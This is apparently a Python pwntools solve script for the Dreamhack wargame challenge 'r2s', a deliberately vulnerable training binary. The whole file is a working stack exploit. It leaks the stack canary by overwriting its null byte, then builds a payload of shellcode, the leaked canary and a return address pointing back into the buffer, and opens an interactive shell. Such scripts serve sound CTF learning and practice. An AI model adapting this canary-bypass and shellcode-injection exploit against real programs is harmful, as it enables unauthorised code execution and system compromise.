from pwn import *

def slog(n,m): return success(': '.join([n, hex(m)]))

p = process('./r2s')
#p = remote('host3.dreamhack.games',20520)

context.arch = 'amd64'

p.recvuntil(b'buf: ')
buf = int(p.recvline()[:-1],16)

slog('Address of buf',buf)

p.recvuntil(b'$rbp: ')

buf2sfp = int(p.recvline().split()[0])
buf2cnry = buf2sfp - 8


slog('buf <==> sfp',buf2sfp)
slog('buf <==> canary',buf2cnry)

payload = b'A'*(buf2cnry+1) # +1 : null overwrite
p.sendafter(b'Input:',payload)
p.recvuntil(payload)

#cnry = p.recvn(8)
#print(cnry)
#print(hex(u64(b'\x00'+p.recvn(7))))

cnry = u64(b'\x00'+p.recvn(7))
slog('Canary',cnry)

sh = asm(shellcraft.sh())

payload = sh.ljust(buf2cnry,b'A') + p64(cnry) + b'B'*0x8 + p64(buf)

#payload = sh.ljust(buf2cnry,b'A') + p64(cnry) + b'B'*0x8 + p64(buf)
# print(''.join(f"{byte:02x} " for byte in payload))

p.sendlineafter(b'Input:',payload)
p.interactive()

